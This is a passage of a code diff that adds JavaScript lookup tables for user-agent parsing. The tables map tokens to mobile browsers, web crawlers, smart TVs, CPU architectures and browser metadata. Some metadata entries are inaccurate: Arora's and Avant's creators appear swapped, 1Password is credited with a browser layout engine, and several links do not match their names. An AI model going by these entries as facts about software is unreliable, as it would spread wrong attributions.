+            "openwave": "Openwave Browser",
+            "mobilexplorer": "Mobile Explorer",
+            "operamini": "Opera Mini",
+            "opera mini": "Opera Mini",
+            "digital paths": "Digital Paths",
+            "avantgo": "AvantGo",
+            "xiino": "Xiino",
+            "novarra": "Novarra Transcoder",
+            "vodafone": "Vodafone",
+            "docomo": "NTT DoCoMo",
+            "o2": "O2",
+            "mobile": "Generic Mobile",
+            "wireless": "Generic Mobile",
+            "j2me": "Generic Mobile",
+            "midp": "Generic Mobile",
+            "cldc": "Generic Mobile",
+            "up.link": "Generic Mobile",
+            "up.browser": "Generic Mobile",
+            "smartphone": "Generic Mobile",
+            "cellphone": "Generic Mobile",
+            "Raspbian": {
+                "Platform": {
+                    "name": "Raspbian Pi",
+                    "architecture": "32-bit",
+                    "developer": "Raspberry Pi Foundation"
+                }, "Device": { "name": "Computer", "type": "Desktop" }
+            },
+            "Mail.RU_Bot": {
+                "Platform": { "name": "Mail.ru Crawler", "architecture": "32-bit", "developer": "Mail RU" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "Googlebot": {
+                "Platform": {
+                    "name": "Googlebot Crawler",
+                    "architecture": "32-bit",
+                    "developer": "Google Inc"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "Baiduspider": {
+                "Platform": { "name": "Baidu Spider", "architecture": "32-bit", "developer": "Baidu Inc" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "bingbot": {
+                "Platform": { "name": "Bing Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "msnbot": {
+                "Platform": { "name": "MSN Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "MJ12bot": {
+                "Platform": {
+                    "name": "Majestic-12 Distributed Search Bot",
+                    "architecture": "32-bit",
+                    "developer": "Majestic"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "Yahoo! Slurp": {
+                "Platform": {
+                    "name": "Yahoo! Slurp Web Crawler Bot",
+                    "architecture": "32-bit",
+                    "developer": "Yahoo LLC"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "MegaIndex.ru": {
+                "Platform": {
+                    "name": "MegaIndex Crawler Bot",
+                    "architecture": "32-bit",
+                    "developer": "MegaIndex.ru"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "AhrefsBot": {
+                "Platform": {
+                    "name": "Ahrefs Backlink Research Bot",
+                    "architecture": "32-bit",
+                    "developer": "Ahrefs"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "DotBot": {
+                "Platform": {
+                    "name": "OpenSite Explorer Crawler",
+                    "architecture": "32-bit",
+                    "developer": "The Moz"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "JobboerseBot": {
+                "Platform": {
+                    "name": "Jobboerse Crawler",
+                    "architecture": "32-bit",
+                    "developer": "jobboerse.com"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "SemrushBot": {
+                "Platform": { "name": "SEMRush Crawler", "architecture": "32-bit", "developer": "SEMrush" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "YandexBot": {
+                "Platform": { "name": "Yandex Search Bot", "architecture": "32-bit", "developer": "Yandex" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "seoscanners.net": {
+                "Platform": {
+                    "name": "SEO Scanners Crawler Bot",
+                    "architecture": "32-bit",
+                    "developer": "SEO Scanners"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "SEOkicks-Robot": {
+                "Platform": {
+                    "name": "SEOkicks Crawler",
+                    "architecture": "32-bit",
+                    "developer": "SEOkicks"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "CheckMarkNetwork": {
+                "Platform": {
+                    "name": "CheckMark Network Crawler",
+                    "architecture": "32-bit",
+                    "developer": "CheckMark"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "BingPreview": {
+                "Platform": {
+                    "name": "Bing Preview Snapshot Generator",
+                    "architecture": "32-bit",
+                    "developer": "Microsoft Corp"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "VoilaBot BETA": {
+                "Platform": {
+                    "name": "VoilaBot BETA",
+                    "architecture": "32-bit",
+                    "developer": "orange ft group"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "adscanner": {
+                "Platform": { "name": "AdScanner Crawler", "architecture": "32-bit", "developer": "AdScanner" },
+                "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "Qwantify": {
+                "Platform": {
+                    "name": "Qwantify Search Crawler",
+                    "architecture": "32-bit",
+                    "developer": "Qwantify"
+                }, "Device": { "name": "Crawler", "type": "Server" }
+            },
+            "apple tv": { "name": "AppleTV", "device": "Television", "manufacture": "Apple Inc." },
+            "chromecast": { "name": "Chromecast", "device": "Television", "manufacture": "Google Inc." },
+            "aftb": { "name": "Fire TV", "device": "Television", "manufacture": "Amazon.com, Inc." },
+            "freebox": { "name": "Freebox Revolution", "device": "Television", "manufacture": "FREE SAS." },
+            "googletv": { "name": "Google TV", "device": "Television", "manufacture": "Sony." },
+            "netbox": { "name": "Netbox", "device": "Television", "manufacture": "Sony." },
+            "playstation 3": { "name": "Playstation 3", "device": "Television", "manufacture": "Sony." },
+            "playstation 4": { "name": "Playstation 4", "device": "Television", "manufacture": "Sony." },
+            "kdl32Cx525": { "name": "KDL32CX525", "tdeviceype": "Television", "manufacture": "Sony." },
+            "nsz-gs7\\\/gx70": { "name": "NSZ-GS7\/GX70", "device": "Television", "manufacture": "Sony." },
+            "h96 pro\\+": { "name": "H96 Pro+", "device": "Television", "manufacture": "Alfawise." },
+            "mx enjoy tv": { "name": "MX Enjoy TV BOX", "device": "Television", "manufacture": "Geniatech." },
+            "smarttv2016": { "name": "Series J (2016)", "device": "Television", "manufacture": "Samsung." },
+            "smart-tv": { "name": "Smart TV", "device": "Television", "manufacture": "Samsung." },
+            "tpm171e": { "name": "TPM171E", "device": "Television", "manufacture": "Philips." },
+            "smarttva": { "name": "TV", "device": "Television", "manufacture": "LG." },
+            "vap430": { "name": "VAP430", "device": "Television", "manufacture": "Vizio." },
+            "viera": { "name": "Viera TV", "device": "Television", "manufacture": "Panasonic." },
+            "webtv": { "name": "WebTV", "device": "Television", "manufacture": "Microsoft." },
+            "xbox": { "name": "Xbox 360", "device": "Television", "manufacture": "Microsoft." },
+            "xbox one": { "name": "Xbox One", "device": "Television", "manufacture": "Microsoft." },
+            "wii": { "name": "Wii", "device": "Television", "manufacture": "Nintendo." },
+            "wiiu": { "name": "WiiU", "device": "Television", "manufacture": "Nintendo." },
+            "x96 mini": { "name": "X96 mini", "device": "Television", "manufacture": "ShySky." }
+        };
+        /*Devices Categories*/
+        this.devicesCategoryList = {
+            'linux': 'linux',
+            'mac': 'mac',
+            'win': 'win',
+            'mobi': 'mobi',
+        };
+        /*Devices architecture List*/
+        this.devicesArchitectureList = {
+            "ARMv1": "32 bit",
+            "ARMv2": "32 bit",
+            "ARMv3": "32 bit",
+            "ARMv4": "32 bit",
+            "ARMv4T": "32 bit",
+            "ARMv5TE": "32 bit",
+            "ARMv6": "32 bit",
+            "ARMv6-M": "32 bit",
+            "ARMv7-M": "32 bit",
+            "ARMv7E-M": "32 bit",
+            "ARMv8-M": "32 bit",
+            "ARMv7-R": "32 bit",
+            "ARMv8-R": "32 bit",
+            "ARMv7-A": "32 bit",
+            "ARMv8-A": "64 bit",
+            "ARMv8.1-A": "64\/32 bit",
+            "ARMv8.2-A": "64\/32 bit",
+            "ARMv8.3-A": "64\/32 bit",
+            "ARMv8.4-A": "64\/32 bit",
+            "ARMv8.5-A": "64\/32 bit",
+            "ARMv8.6-A": "64\/32 bit",
+            "i286": "16 Bit",
+            "Win16": "16 Bit",
+            "i386": "32 Bit",
+            "i486": "32 Bit",
+            "i586": "32 Bit",
+            "i686": "32 Bit",
+            "i786": "32 Bit",
+            "x86": "32 Bit",
+            "x64": "64 Bit",
+            "WOW64": "64 Bit",
+            "Win64": "64 Bit",
+            "x86_64": "64 Bit",
+            "x86-64": "64 Bit",
+            "x64\\\/x86": "64 Bit",
+            "IA-64": "64 Bit",
+            "ARM64": "64 Bit",
+            "AMD64": "64 Bit",
+            "Intel64": "64 Bit"
+        };
+        /*Platform's Window Manager*/
+        this.devicesPlatformWMNameList = {
+            'x11': { 'name': 'Linux Desktop,', 'type': 'X11 Window Manager.' },
+            'win': { 'name': 'Windows Desktop,', 'type': 'Windows Window Manager.', },
+            'mac': { 'name': 'Macintosh,', 'type': 'Mac Window Manager.', },
+        };
+        /*Web Browser List*/
+        this.webBrowserList = {
+            "007ac9 Crawler": {
+                "name": "007ac9 Crawler",
+                "type": "Crawler",
+                "ui": "FullTextMode",
+                "developer": "007ac9",
+                "link": "http:\/\/crawler.007ac9.net"
+            },
+            "115Browser": {
+                "name": "115 Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "115 Team",
+                        "link": "https:\/\/115.com\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Unknown"
+                    }
+                ],
+                "layout": "Unknown",
+                "latest-release": {
+                    "version": "Unknown",
+                    "date": "Unknown"
+                }
+            },
+            "126BROWSER": {
+                "name": "126 BROWSER",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Unknown"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Unknown",
+                "licence": [
+                    {
+                        "name": "Unknown"
+                    }
+                ],
+                "layout": "Unknown",
+                "latest-release": {
+                    "version": "Unknown",
+                    "date": "Unknown"
+                }
+            },
+            "1337Browser": {
+                "name": "1337 Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Unknown"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Unknown",
+                "licence": [
+                    {
+                        "name": "Unknown"
+                    }
+                ],
+                "layout": "Unknown",
+                "latest-release": {
+                    "version": "Unknown",
+                    "date": "Unknown"
+                }
+            },
+            "1Password": {
+                "name": "1 Password",
+                "type": "Password Manager",
+                "ui": "FullTextMode",
+                "creator": [
+                    {
+                        "name": "AgileBits Inc",
+                        "link": "https:\/\/1password.com\/"
+                    }
+                ],
+                "cost": "Trialware",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Trialware",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trialware"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Trident",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "7.5.1",
+                        "date": "May 4, 2020"
+                    },
+                    "iOS": {
+                        "version": "7.5.2",
+                        "date": "April 22, 2020"
+                    },
+                    "macOS": {
+                        "version": "7.5",
+                        "date": "May 5, 2020"
+                    },
+                    "Windows": {
+                        "version": "7.4.767",
+                        "date": "April 27, 2020"
+                    }
+                }
+            },
+            "1stBrowser": "1st Browser",
+            "2345Explorer": "2345 Explorer",
+            "Mb2345Browser": "2345 Browser",
+            "2345chrome": "2345 Chrome",
+            "360SE": "360 Secure Browser",
+            "Amaya": {
+                "name": "Amaya",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "W3C",
+                        "link": "https:\/\/www.w3.org\/"
+                    },
+                    {
+                        "name": "INRIA",
+                        "link": "http:\/\/www.inria.fr\/en\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "W3C",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/W3C_Software_Notice_and_License"
+                    }
+                ],
+                "layout": "custom",
+                "latest-release": {
+                    "version": "11.4.4",
+                    "date": "January 18, 2012"
+                }
+            },
+            "AOL": {
+                "name": "AOL Explorer",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "America Online, Inc",
+                        "link": "https:\/\/www.aol.com\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Trident",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "1.5",
+                    "date": "May 10, 2016"
+                }
+            },
+            "Arora": {
+                "name": "Arora",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Avant Force"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": {
+                    "version": "0.11.0",
+                    "date": "27 September 2010"
+                }
+            },
+            "Avant": {
+                "name": "Avant ",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Benjamin C. Meyer"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(layout_engine)"
+                    },
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    },
+                    {
+                        "name": "Trident",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "2020 build 3",
+                    "date": "March 17, 2020"
+                }
+            },
+            "Basilisk": {
+                "name": "Basilisk ",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Moonchild Productions",
+                        "link": "https:\/\/www.basilisk-browser.org\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Goanna",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "2020.10.05",
+                    "date": "5 October 2020"
+                }
+            },
+            "Blisk": {
+                "name": "Blisk",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Blisk team"
+                    }
+                ],
+                "cost": {
+                    "Free": "Limited",
+                    "Paid": "Unlimited Pro"
+                },
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    },
+                    {
+                        "name": "V8",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "12.0.92.83",
+                    "date": "June 29, 2019"
+                }
+            },
+            "BeakerBrowser": {
+                "name": "Beaker",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Blue Link Labs",
+                        "link": "https:\/\/beakerbrowser.com\/about"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MIT License",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "macOS": {
+                        "version": "0.8.10",
+                        "date": "March 13, 2020"
+                    },
+                    "Windows": {
+                        "version": "0.8.10",
+                        "date": "March 13, 2020"
+                    },
+                    "Linux": {
+                        "version": "0.8.10",
+                        "date": "March 13, 2020"
+                    }
+                }
+            },
+            "Electron": {
+                "name": "Electron",
+                "type": "Electron (software framework)",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "GitHub",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GitHub"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MIT License",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "10.1.5",
+                        "date": "23 October 2020"
+                    },
+                    "Preview release": {
+                        "version": "11.0.0-beta.16",
+                        "date": "24 October 2020"
+                    }
+                }
+            },
+            "Brave": {
+                "name": "Brave Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Brave Software Inc",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Brave_(browser)"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "1.15.73",
+                        "date": "15 October 2020"
+                    },
+                    "iOS": {
+                        "version": "1.20",
+                        "date": "25 September 2020"
+                    },
+                    "macOS": {
+                        "version": "1.15.75",
+                        "date": "16 October 2020"
+                    },
+                    "Windows": {
+                        "version": "1.15.75",
+                        "date": "16 October 2020"
+                    },
+                    "Linux": {
+                        "version": "1.15.75",
+                        "date": "16 October 2020"
+                    }
+                }
+            },
+            "Camino": {
+                "name": "Camino",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "The Camino Project"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "MPL 1.1",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    },
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    },
+                    {
+                        "name": "LGPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "2.1.2",
+                    "date": "14 March 2012"
+                }
+            },
+            "Cliqz": {
+                "name": "Cliqz",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Cliqz GmbH"
+                    }
+                ],
+                "cost": "Free",
+                "status": "discontinued",
+                "licence": [
+                    {
+                        "name": "MPL 2.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Gecko",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "1.9.7",
+                        "date": "April 4, 2020"
+                    },
+                    "iOS": {
+                        "version": "3.6.3",
+                        "date": "June 30, 2020"
+                    },
+                    "macOS": {
+                        "version": "1.38.0",
+                        "date": "July 22, 2020"
+                    },
+                    "Windows": {
+                        "version": "1.38.0",
+                        "date": "July 22, 2020"
+                    },
+                    "Linux": {
+                        "version": "1.38.0",
+                        "date": "July 22, 2020"
+                    }
+                }
+            },
+            "Edg": {
+                "name": "Microsoft Edge",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Microsoft Corp",
+                        "link": "https:\/\/www.microsoftedgeinsider.com\/en-us\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "88.0.673.0",
+                    "date": "14 October 2020"
+                }
+            },
+            "Opera": {
+                "name": "Opera",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Opera Software",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "version": "71.0.3770.271",
+                    "date": "14 October 2020"
+                }
+            },
+            "Opera Mobile": {
+                "name": "Opera",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Opera Software",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "59.1.2926.54067",
+                        "date": "July 13, 2020"
+                    },
+                    "Android (classic)": {
+                        "version": "12.1.9",
+                        "date": "June 8, 2016"
+                    },
+                    "Symbian": {
+                        "version": "S60 12.0.22",
+                        "date": "June 24, 2012"
+                    },
+                    "Windows Mobile": {
+                        "version": "10.0",
+                        "date": "March 16, 2010"
+                    }
+                }
+            },
+            "whale": {
+                "name": "Naver Whale",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Naver Corporation",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Naver_Corporation"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Freeware",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "1.5.4.2",
+                        "date": "May 26, 2020"
+                    },
+                    "iOS": {
+                        "version": "1.5.0",
+                        "date": "May 25, 2020"
+                    },
+                    "macOS": {
+                        "version": "2.7.100.20",
+                        "date": "June 18, 2020"
+                    },
+                    "Windows": {
+                        "version": "2.7.100.20",
+                        "date": "June 18, 2020"
+                    },
+                    "Linux": {
+                        "version": "2.7.100.20",
+                        "date": "June 18, 2020"
+                    }
+                }
+            },
+            "Falkon": {
+                "name": "Falkon",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "David Rosca",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL 3.0",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "3.1.0.75",
+                        "date": "March 19, 2019"
+                    }
+                ]
+            },
+            "Konqueror": {
+                "name": "Konqueror Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "KDE",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/KDE"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "GPL",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "KHTML",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/KHTML"
+                    },
+                    {
+                        "name": "WebKit",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
+                    }
+                ],
+                "latest-release": {
+                    "Stable release": {
+                        "version": "20.08.2",
+                        "date": "7 June 2018"
+                    },
+                    "Preview release": []
+                }
+            },
+            "YaBrowser": {
+                "name": "Yandex Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Yandex",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Yandex"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "Proprietary",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "20.6.3.54",
+                        "date": "July 23, 2020"
+                    },
+                    "iOS": {
+                        "version": "20.6.2.318",
+                        "date": "July 16, 2020"
+                    },
+                    "macOS": {
+                        "version": "20.7.2",
+                        "date": "July 2020"
+                    },
+                    "Windows": {
+                        "version": "20.7.2",
+                        "date": "July 2020"
+                    },
+                    "Linux": {
+                        "version": "20.7.2",
+                        "date": "July 2020"
+                    }
+                }
+            },
+            "QtWebEngine": {
+                "name": "Qt Web Engine based browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Dooble Project Team",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": [
+                    {
+                        "version": "2020.10.10",
+                        "date": "October 10, 2020"
+                    }
+                ]
+            },
+            "Iron": {
+                "name": "SRWare Iron",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "SRWare",
+                        "link": "www.srware.net\/en\/software_srware_iron.php"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    },
+                    {
+                        "name": "V8",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "74.0.3850.0",
+                        "date": "May 10, 2019"
+                    },
+                    "macOS": {
+                        "version": "84.0.4300.0",
+                        "date": "August 29, 2020"
+                    },
+                    "Windows": {
+                        "version": "85.0.4350.0",
+                        "date": "October 2, 2020"
+                    },
+                    "Linux": {
+                        "version": "85.0.4350.0",
+                        "date": "October 6, 2020"
+                    }
+                }
+            },
+            "Chrome": {
+                "name": "Google Chrome",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "Google LLC",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Google"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD (Chromium executable) (some closed-source features)",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
+                    }
+                ],
+                "layout": [
+                    {
+                        "name": "Blink",
+                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
+                    }
+                ],
+                "latest-release": {
+                    "Android": {
+                        "version": "86.0.4240.114",
+                        "date": "October 22, 2020"
+                    },
+                    "iOS": {
+                        "version": "86.0.4240.93",
+                        "date": "October 12, 2020"
+                    },
+                    "macOS": {
+                        "version": "86.0.4240.111",
+                        "date": "October 20, 2020"
+                    },
+                    "Windows": {
+                        "version": "86.0.4240.111",
+                        "date": "October 20, 2020"
+                    },
+                    "Linux": {
+                        "version": "86.0.4240.111",
+                        "date": "October 20, 2020"
+                    }
+                }
+            },
+            "Chromium": {
+                "name": "Chromium Browser",
+                "type": "Web Browser",
+                "ui": "GraphicalMode",
+                "creator": [
+                    {
+                        "name": "The Chromium Project",
+                        "link": "https:\/\/www.chromium.org\/"
+                    }
+                ],
+                "cost": "Free",
+                "status": "Active",
+                "licence": [
+                    {
+                        "name": "BSD",
